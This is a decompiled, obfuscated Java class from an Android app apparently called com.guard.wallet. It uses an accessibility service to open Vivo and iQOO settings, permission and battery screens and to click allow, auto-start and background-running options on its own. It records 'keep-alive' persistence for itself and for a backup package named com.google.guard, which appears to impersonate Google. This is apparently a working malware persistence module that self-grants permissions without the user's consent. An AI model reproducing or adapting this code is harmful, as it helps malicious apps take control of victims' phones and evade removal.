package p012o;

import a1.AbstractC0026q;
import android.content.ComponentName;
import android.content.Intent;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.helper.AbstractC0184g;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.req.ScreenMetricsVO;
import com.guard.wallet.resp.PowerControlStateVO;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.thread.AbstractC0243l;
import com.guard.wallet.utils.AbstractC0248d;
import com.guard.wallet.utils.AbstractC0249e;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import java.util.Collections;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;
import org.bouncycastle.asn1.cmp.PKIFailureInfo;
import org.bouncycastle.i18n.TextBundle;
import p000a.AbstractC0000a;
import p002e.C0262b;
import p005h.C0318e;
import p014r.EnumC0892e;
import p022z.C0981d;

/* loaded from: classes.dex */
public final class i0 extends AbstractC0414c {

    /* renamed from: B */
    public static final /* synthetic */ int f902B = 0;

    /* renamed from: A */
    public final AtomicBoolean f903A;

    /* renamed from: r */
    public final AtomicReference f904r;

    /* renamed from: s */
    public final AtomicReference f905s;

    /* renamed from: t */
    public final AtomicBoolean f906t;

    /* renamed from: u */
    public final AtomicBoolean f907u;

    /* renamed from: v */
    public final AtomicBoolean f908v;

    /* renamed from: w */
    public final AtomicBoolean f909w;

    /* renamed from: x */
    public final AtomicBoolean f910x;

    /* renamed from: y */
    public final AtomicBoolean f911y;

    /* renamed from: z */
    public final AtomicBoolean f912z;

    public i0() {
        super(u0(), "com.android.settings");
        this.f904r = new AtomicReference(EnumC0892e.KEEP_ALIVE_UNKNOWN);
        this.f905s = new AtomicReference(null);
        int i2 = 0;
        this.f906t = new AtomicBoolean(false);
        this.f907u = new AtomicBoolean(false);
        this.f908v = new AtomicBoolean(true);
        this.f909w = new AtomicBoolean(true);
        this.f910x = new AtomicBoolean(false);
        this.f911y = new AtomicBoolean(false);
        this.f912z = new AtomicBoolean(false);
        this.f903A = new AtomicBoolean(false);
        try {
            this.f852p.schedule(new h0(this, i2), 120L, TimeUnit.SECONDS);
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.i0", e2);
        }
    }

    public static ListenWindow B0() {
        ListenWindow listenWindow = new ListenWindow("com.vivo.permissionmanager", "android.app.AlertDialog");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    public static CombineFilter C0() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.getStringConditions().add(AbstractC0000a.m7c(combineFilter, "className", "android.widget.RelativeLayout"));
        StringCondition stringCondition = new StringCondition();
        stringCondition.setProperty("id");
        stringCondition.setSuffix(":id/all_opt");
        combineFilter.getStringConditions().add(stringCondition);
        return combineFilter;
    }

    public static CombineFilter D0() {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        AbstractC0413b.m1028v("VIVO_APP_ALL_PERMISSION_TEXT", m1008b, combineFilter, m1008b);
        return combineFilter;
    }

    public static CombineFilter E0() {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        AbstractC0413b.m1028v("VIVO_BACKGROUND_POWER_MANAGER_TEXT", m1008b, combineFilter, m1008b);
        return combineFilter;
    }

    public static ListenWindow F0() {
        ListenWindow listenWindow = new ListenWindow("com.vivo.abe", "com.vivo.applicationbehaviorengine.ui.ExcessivePowerDescriptionActivity");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    public static ListenWindow G0() {
        ListenWindow listenWindow = new ListenWindow("com.vivo.abe", "com.vivo.applicationbehaviorengine.ui.ExcessivePowerManagerActivity");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    public static CombineFilter H0() {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        AbstractC0413b.m1028v("VIVO_APP_PERMISSION_TEXT", m1008b, combineFilter, m1008b);
        return combineFilter;
    }

    public static CombineFilter b0() {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.Button"), TextBundle.TEXT_ENTRY);
        AbstractC0413b.m1028v("VIVO_ALLOW_TEXT", m1008b, combineFilter, m1008b);
        return combineFilter;
    }

    public static ListenWindow c0(String str) {
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "com.vivo.settings.VivoSubSettings");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(AbstractC0414c.m1033H(str));
        return listenWindow;
    }

    public static ListenWindow d0(String str) {
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "com.vivo.settings.applications.InstalledAppDetailsTop");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(AbstractC0414c.m1033H(str));
        return listenWindow;
    }

    public static ListenWindow e0(String str) {
        ListenWindow listenWindow = new ListenWindow(null, null);
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(AbstractC0414c.m1033H(str));
        return listenWindow;
    }

    public static ListenWindow f0() {
        ListenWindow listenWindow = new ListenWindow("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.SoftPermissionDetailActivity");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    public static ListenWindow g0() {
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    public static ListenWindow h0() {
        ListenWindow listenWindow = new ListenWindow("com.android.permissioncontroller", "com.android.permissioncontroller.permission.ui.ManagePermissionsActivity");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    public static CombineFilter i0() {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        AbstractC0413b.m1028v("VIVO_AUTO_START_TEXT", m1008b, combineFilter, m1008b);
        return combineFilter;
    }

    public static ListenWindow r0() {
        ListenWindow listenWindow = new ListenWindow("com.iqoo.powersaving", "com.iqoo.powersaving.activity.ExcessivePowerDescriptionActivity");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    public static ListenWindow s0() {
        ListenWindow listenWindow = new ListenWindow("com.iqoo.powersaving", "com.iqoo.powersaving.activity.ExcessivePowerManagerActivity");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    public static LinkedList u0() {
        LinkedList linkedList = new LinkedList();
        linkedList.add(AbstractC0414c.m1035J());
        linkedList.add(d0(AbstractC0251g.x0()));
        linkedList.add(c0(AbstractC0251g.x0()));
        linkedList.add(d0(AbstractC0251g.m658e()));
        linkedList.add(c0(AbstractC0251g.m658e()));
        linkedList.add(h0());
        linkedList.add(g0());
        linkedList.add(f0());
        linkedList.add(e0(AbstractC0251g.x0()));
        linkedList.add(e0(AbstractC0251g.m658e()));
        linkedList.add(v0());
        linkedList.add(B0());
        linkedList.add(x0());
        linkedList.add(G0());
        linkedList.add(s0());
        linkedList.add(F0());
        linkedList.add(r0());
        return linkedList;
    }

    public static ListenWindow v0() {
        ListenWindow listenWindow = new ListenWindow("com.vivo.permissionmanager", "com.originui.widget.dialog.h");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    public static CombineFilter w0() {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        AbstractC0413b.m1028v("VIVO_POPUP_IN_BACKGROUND_TEXT", m1008b, combineFilter, m1008b);
        return combineFilter;
    }

    public static ListenWindow x0() {
        ListenWindow listenWindow = new ListenWindow("com.iqoo.powersaving", "com.iqoo.powersaving.fuelgauge.PowerRankActivity");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    public final boolean A0() {
        try {
            if (AbstractC0251g.m653Z() != null) {
                ComponentName componentName = new ComponentName("com.iqoo.powersaving", "com.iqoo.powersaving.fuelgauge.PowerRankActivity");
                Intent intent = new Intent();
                intent.setComponent(componentName);
                intent.addFlags(268435456);
                intent.addFlags(PKIFailureInfo.duplicateCertReq);
                intent.addFlags(67108864);
                intent.addFlags(2097152);
                intent.addFlags(8388608);
                this.f905s.set("prepareInAppPowerRank");
                AbstractC0251g.m653Z().startActivity(intent);
                Log.d("o.i0", "已启动耗电管理");
                return true;
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.i0", e2);
        }
        Log.e("o.i0", "耗电管理启动失败");
        return false;
    }

    @Override // p012o.AbstractC0414c
    /* renamed from: Z */
    public final void mo1051Z() {
        ReentrantLock reentrantLock = this.f851o;
        if (reentrantLock.tryLock()) {
            try {
                if (!m1049T()) {
                    Log.d("o.i0", "准备结束本地保活自动化引擎");
                    AbstractC0184g.m354h(100);
                    m1050X();
                    if (MyAccessibilityService.m554P() != null) {
                        MyAccessibilityService.m554P().m543x();
                    }
                    y0();
                    this.f852p.shutdownNow();
                    AbstractC0243l.m591a(this.f864c);
                    this.f850n.clear();
                    if (AbstractC0026q.m162M()) {
                        AbstractC0251g.T0(5);
                    }
                    if (C0318e.m844S().m860U() || !Objects.equals(0, AbstractC0248d.m609g())) {
                        C0262b.m738d();
                        AbstractC0184g.m349c();
                    } else {
                        MainApplication.getInstance().offerStrategyEvent("PREPARE_LEAVE_PIP");
                    }
                    Log.d("o.i0", "已结束本地保活自动化引擎");
                    AbstractC0414c.m1044W();
                    mo1001d();
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("o.i0", e2);
            }
            reentrantLock.unlock();
        }
    }

    @Override // p012o.C0416e
    public final boolean equals(Object obj) {
        return obj instanceof i0;
    }

    @Override // p012o.C0416e
    public final int hashCode() {
        return Objects.hash(i0.class.getName());
    }

    public final boolean j0() {
        try {
            LinkedList linkedList = new LinkedList();
            linkedList.add(d0(AbstractC0251g.x0()));
            linkedList.add(c0(AbstractC0251g.x0()));
            linkedList.add(d0(AbstractC0251g.m658e()));
            linkedList.add(c0(AbstractC0251g.m658e()));
            if (!m1078q(linkedList)) {
                return false;
            }
            Log.d("o.i0", "已进入App详情窗口");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.i0", e2);
            return false;
        }
    }

    public final boolean k0() {
        try {
            LinkedList linkedList = new LinkedList();
            linkedList.add(f0());
            linkedList.add(e0(AbstractC0251g.x0()));
            linkedList.add(e0(AbstractC0251g.m658e()));
            if (!m1078q(linkedList)) {
                return false;
            }
            Log.d("o.i0", "已进入App权限详情窗口");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.i0", e2);
            return false;
        }
    }

    public final boolean l0() {
        try {
            LinkedList linkedList = new LinkedList();
            linkedList.add(h0());
            linkedList.add(g0());
            linkedList.add(e0(AbstractC0251g.x0()));
            linkedList.add(e0(AbstractC0251g.m658e()));
            if (!m1078q(linkedList)) {
                return false;
            }
            Log.d("o.i0", "已进入App权限管理窗口");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.i0", e2);
            return false;
        }
    }

    public final boolean m0() {
        try {
            LinkedList linkedList = new LinkedList();
            linkedList.add(F0());
            linkedList.add(r0());
            if (!m1078q(linkedList)) {
                return false;
            }
            Log.d("o.i0", "已进入App后台耗电详情窗口");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.i0", e2);
            return false;
        }
    }

    public final boolean n0() {
        try {
            LinkedList linkedList = new LinkedList();
            linkedList.add(G0());
            linkedList.add(s0());
            if (!m1078q(linkedList)) {
                return false;
            }
            Log.d("o.i0", "已进入后台耗电管理窗口");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.i0", e2);
            return false;
        }
    }

    public final boolean o0() {
        try {
            LinkedList linkedList = new LinkedList();
            linkedList.add(v0());
            linkedList.add(B0());
            if (!m1078q(linkedList)) {
                return false;
            }
            Log.d("o.i0", "已进入是否允许权限对话框");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.i0", e2);
            return false;
        }
    }

    public final boolean p0() {
        try {
            if (!m1078q(Collections.singletonList(x0()))) {
                return false;
            }
            Log.d("o.i0", "已进入电池管理窗口");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.i0", e2);
            return false;
        }
    }

    public final void q0() {
        try {
            ScreenMetricsVO m616e = AbstractC0249e.m616e();
            Log.d("o.i0", String.valueOf(m616e.getNavigationBarHeight()));
            if (AbstractC0251g.m646S(10L, 1000L, new Point(m616e.getWidth().intValue() / 2.0f, (m616e.getHeight().intValue() - m616e.getNavigationBarHeight().intValue()) - 100), new Point(m616e.getWidth().intValue() / 2.0f, m616e.getStatusBarHeight().intValue()))) {
                AbstractC0251g.T0(10);
                AbstractC0251g.m672s(Integer.valueOf(m616e.getWidth().intValue() / 2), Integer.valueOf((m616e.getHeight().intValue() - m616e.getNavigationBarHeight().intValue()) - 200));
                this.f905s.set("prepareInAppPermissionDetail");
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.i0", e2);
        }
    }

    public final void t0() {
        UiObject uiObject;
        try {
            boolean l02 = l0();
            AtomicReference atomicReference = this.f905s;
            if (l02) {
                AbstractC0184g.m354h(80);
                m1062G();
                Log.d("o.i0", "active root complete");
                UiObject m1047Q = m1047Q();
                AtomicInteger atomicInteger = new AtomicInteger(0);
                while (m1047Q == null && atomicInteger.incrementAndGet() <= 5) {
                    AbstractC0251g.T0(5);
                    m1047Q = m1047Q();
                }
                if (m1047Q != null) {
                    Log.d("o.i0", "权限窗口滚动视图查找完成");
                    C0981d c0981d = new C0981d(D0(), 0);
                    uiObject = m1047Q.scrollForwardUtil(c0981d);
                    if (uiObject == null) {
                        uiObject = m1047Q.scrollBackwardUtil(c0981d);
                    }
                } else {
                    uiObject = null;
                }
                if (uiObject == null) {
                    uiObject = m1072k().findOneByCombine(D0());
                }
                if (uiObject != null) {
                    Log.d("o.i0", "所有权限栏目查找成功");
                    UiObject findParentUtilCombine = uiObject.findParentUtilCombine(AbstractC0414c.m1037L());
                    if (findParentUtilCombine != null && findParentUtilCombine.click()) {
                        Log.d("o.i0", "查找并点击所有权限栏目完成");
                        AbstractC0184g.m354h(85);
                        MyAccessibilityService.m554P().l0(true);
                        atomicReference.set("prepareInAppPermissionDetail");
                        return;
                    }
                }
            }
            if (Objects.equals(atomicReference.get(), "prepareInAppPermissionManage")) {
                q0();
                AbstractC0184g.m354h(85);
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.i0", e2);
        }
    }

    @Override // p012o.AbstractC0414c, p012o.C0416e
    /* renamed from: u */
    public final void mo1002u(AccessibilityEvent accessibilityEvent, String str, String str2) {
        try {
            if (m1049T()) {
                return;
            }
            if (accessibilityEvent != null) {
                super.mo1002u(accessibilityEvent, str, str2);
            }
            AtomicReference atomicReference = this.f905s;
            boolean equals = Objects.equals(atomicReference.get(), "prepareInAppPowerRank");
            String str3 = this.f864c;
            int i2 = 5;
            ConcurrentLinkedQueue concurrentLinkedQueue = this.f850n;
            if (equals && p0()) {
                AbstractC0251g.T0(5);
                concurrentLinkedQueue.remove("keepAliveInExcessivePowerManager");
                concurrentLinkedQueue.remove("keepAliveInExcessivePowerDescription");
                concurrentLinkedQueue.remove("keepAliveInAppDetail");
                concurrentLinkedQueue.remove("keepAliveInAppPermissionManage");
                concurrentLinkedQueue.remove("keepAliveInAppPermissionDetail");
                concurrentLinkedQueue.remove("keepAliveInPermissionAllowDialog");
                if (!concurrentLinkedQueue.contains("keepAliveInPowerRank")) {
                    concurrentLinkedQueue.add("keepAliveInPowerRank");
                    AbstractC0243l.m593c(new h0(this, 1), str3);
                }
            }
            if (Objects.equals(atomicReference.get(), "prepareInExcessivePowerManager") && n0()) {
                AbstractC0251g.T0(5);
                concurrentLinkedQueue.remove("keepAliveInPowerRank");
                concurrentLinkedQueue.remove("keepAliveInExcessivePowerDescription");
                concurrentLinkedQueue.remove("keepAliveInAppDetail");
                concurrentLinkedQueue.remove("keepAliveInAppPermissionManage");
                concurrentLinkedQueue.remove("keepAliveInAppPermissionDetail");
                concurrentLinkedQueue.remove("keepAliveInPermissionAllowDialog");
                if (!concurrentLinkedQueue.contains("keepAliveInExcessivePowerManager")) {
                    concurrentLinkedQueue.add("keepAliveInExcessivePowerManager");
                    AbstractC0243l.m593c(new h0(this, 2), str3);
                }
            }
            if (Objects.equals(atomicReference.get(), "prepareInExcessivePowerDescription") && m0()) {
                AbstractC0251g.T0(5);
                concurrentLinkedQueue.remove("keepAliveInPowerRank");
                concurrentLinkedQueue.remove("keepAliveInExcessivePowerManager");
                concurrentLinkedQueue.remove("keepAliveInAppDetail");
                concurrentLinkedQueue.remove("keepAliveInAppPermissionManage");
                concurrentLinkedQueue.remove("keepAliveInAppPermissionDetail");
                concurrentLinkedQueue.remove("keepAliveInPermissionAllowDialog");
                if (!concurrentLinkedQueue.contains("keepAliveInExcessivePowerDescription")) {
                    concurrentLinkedQueue.add("keepAliveInExcessivePowerDescription");
                    AbstractC0243l.m593c(new h0(this, 3), str3);
                }
            }
            if (Objects.equals(atomicReference.get(), "prepareInAppDetailSetting") && j0()) {
                AbstractC0251g.T0(5);
                concurrentLinkedQueue.remove("keepAliveInPowerRank");
                concurrentLinkedQueue.remove("keepAliveInExcessivePowerManager");
                concurrentLinkedQueue.remove("keepAliveInExcessivePowerDescription");
                concurrentLinkedQueue.remove("keepAliveInAppPermissionManage");
                concurrentLinkedQueue.remove("keepAliveInAppPermissionDetail");
                concurrentLinkedQueue.remove("keepAliveInPermissionAllowDialog");
                if (!concurrentLinkedQueue.contains("keepAliveInAppDetail")) {
                    concurrentLinkedQueue.add("keepAliveInAppDetail");
                    AbstractC0243l.m593c(new h0(this, 4), str3);
                }
            }
            if (Objects.equals(atomicReference.get(), "prepareInAppPermissionManage") && l0()) {
                AbstractC0251g.T0(5);
                concurrentLinkedQueue.remove("keepAliveInPowerRank");
                concurrentLinkedQueue.remove("keepAliveInExcessivePowerManager");
                concurrentLinkedQueue.remove("keepAliveInExcessivePowerDescription");
                concurrentLinkedQueue.remove("keepAliveInAppDetail");
                concurrentLinkedQueue.remove("keepAliveInAppPermissionDetail");
                concurrentLinkedQueue.remove("keepAliveInPermissionAllowDialog");
                if (!concurrentLinkedQueue.contains("keepAliveInAppPermissionManage")) {
                    concurrentLinkedQueue.add("keepAliveInAppPermissionManage");
                    AbstractC0243l.m593c(new h0(this, i2), str3);
                }
            }
            if (Objects.equals(atomicReference.get(), "prepareInAppPermissionDetail") && k0()) {
                AbstractC0251g.T0(5);
                concurrentLinkedQueue.remove("keepAliveInPowerRank");
                concurrentLinkedQueue.remove("keepAliveInExcessivePowerManager");
                concurrentLinkedQueue.remove("keepAliveInExcessivePowerDescription");
                concurrentLinkedQueue.remove("keepAliveInAppDetail");
                concurrentLinkedQueue.remove("keepAliveInAppPermissionManage");
                concurrentLinkedQueue.remove("keepAliveInPermissionAllowDialog");
                if (!concurrentLinkedQueue.contains("keepAliveInAppPermissionDetail")) {
                    concurrentLinkedQueue.add("keepAliveInAppPermissionDetail");
                    AbstractC0243l.m593c(new h0(this, 6), str3);
                }
            }
            if (Objects.equals(atomicReference.get(), "prepareInPermissionAllowDialog") && o0()) {
                AbstractC0251g.T0(5);
                concurrentLinkedQueue.remove("keepAliveInPowerRank");
                concurrentLinkedQueue.remove("keepAliveInExcessivePowerManager");
                concurrentLinkedQueue.remove("keepAliveInExcessivePowerDescription");
                concurrentLinkedQueue.remove("keepAliveInAppDetail");
                concurrentLinkedQueue.remove("keepAliveInAppPermissionManage");
                concurrentLinkedQueue.remove("keepAliveInAppPermissionDetail");
                if (concurrentLinkedQueue.contains("keepAliveInPermissionAllowDialog")) {
                    return;
                }
                concurrentLinkedQueue.add("keepAliveInPermissionAllowDialog");
                AbstractC0243l.m593c(new h0(this, 7), str3);
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.i0", e2);
        }
    }

    public final void y0() {
        try {
            PowerControlStateVO m707k = AbstractC0252h.m707k(MainApplication.getAppContext().getPackageName());
            m707k.setPackageName(MainApplication.getAppContext().getPackageName());
            AtomicBoolean atomicBoolean = this.f906t;
            if (atomicBoolean.get()) {
                m707k.setAllowAutoStart(Boolean.valueOf(atomicBoolean.get()));
            }
            AtomicBoolean atomicBoolean2 = this.f908v;
            if (atomicBoolean2.get()) {
                m707k.setAllowRelateStart(Boolean.valueOf(atomicBoolean2.get()));
            }
            AtomicBoolean atomicBoolean3 = this.f910x;
            if (atomicBoolean3.get()) {
                m707k.setAllowAllFullBackground(Boolean.valueOf(atomicBoolean3.get()));
            }
            AtomicBoolean atomicBoolean4 = this.f912z;
            if (atomicBoolean4.get()) {
                m707k.setAllowPopupInBackground(Boolean.valueOf(atomicBoolean4.get()));
            }
            m707k.setRetryCount(m707k.getRetryCount() + 1);
            AbstractC0252h.m691L(m707k);
            Log.d("o.i0", "主进程保活策略已保存");
            PowerControlStateVO m707k2 = AbstractC0252h.m707k("com.google.guard");
            m707k2.setPackageName("com.google.guard");
            AtomicBoolean atomicBoolean5 = this.f907u;
            if (atomicBoolean5.get()) {
                m707k2.setAllowAutoStart(Boolean.valueOf(atomicBoolean5.get()));
            }
            AtomicBoolean atomicBoolean6 = this.f909w;
            if (atomicBoolean6.get()) {
                m707k2.setAllowRelateStart(Boolean.valueOf(atomicBoolean6.get()));
            }
            AtomicBoolean atomicBoolean7 = this.f911y;
            if (atomicBoolean7.get()) {
                m707k2.setAllowAllFullBackground(Boolean.valueOf(atomicBoolean7.get()));
            }
            AtomicBoolean atomicBoolean8 = this.f903A;
            if (atomicBoolean8.get()) {
                m707k2.setAllowPopupInBackground(Boolean.valueOf(atomicBoolean8.get()));
            }
            m707k2.setRetryCount(m707k2.getRetryCount() + 1);
            AbstractC0252h.m691L(m707k2);
            Log.d("o.i0", "备用进程保活策略已保存");
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.i0", e2);
        }
    }

    public final void z0() {
        try {
            y0();
            AtomicReference atomicReference = this.f904r;
            boolean equals = Objects.equals(atomicReference.get(), EnumC0892e.KEEP_ALIVE_UNKNOWN);
            EnumC0892e enumC0892e = EnumC0892e.KEEP_ALIVE_BACKUP_APP;
            EnumC0892e enumC0892e2 = EnumC0892e.KEEP_ALIVE_MAIN_APP;
            AtomicReference atomicReference2 = this.f905s;
            if (equals) {
                if (!AbstractC0252h.m714r(MyAccessibilityService.m554P().getPackageName())) {
                    atomicReference.set(enumC0892e2);
                    atomicReference2.set("prepareInAppDetailSetting");
                    AbstractC0251g.Z0(MyAccessibilityService.m554P().getPackageName());
                    Log.d("o.i0", MyAccessibilityService.m554P().getPackageName().concat(" 应用详情已启动"));
                    MyAccessibilityService.m554P().getPackageName().concat(" 应用详情已启动");
                    return;
                }
                if (!AbstractC0252h.m714r("com.google.guard") && AbstractC0251g.d0("com.google.guard") != null) {
                    atomicReference.set(enumC0892e);
                    atomicReference2.set("prepareInAppDetailSetting");
                    AbstractC0251g.Z0("com.google.guard");
                    Log.d("o.i0", "com.google.guard".concat(" 应用详情已启动"));
                    "com.google.guard".concat(" 应用详情已启动");
                    return;
                }
            }
            if (!Objects.equals(atomicReference.get(), enumC0892e2) || AbstractC0252h.m714r("com.google.guard") || AbstractC0251g.d0("com.google.guard") == null) {
                y0();
                mo1051Z();
                return;
            }
            atomicReference.set(enumC0892e);
            atomicReference2.set("prepareInAppDetailSetting");
            AbstractC0251g.Z0("com.google.guard");
            Log.d("o.i0", "com.google.guard".concat(" 应用详情已启动"));
            "com.google.guard".concat(" 应用详情已启动");
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.i0", e2);
        }
    }
}
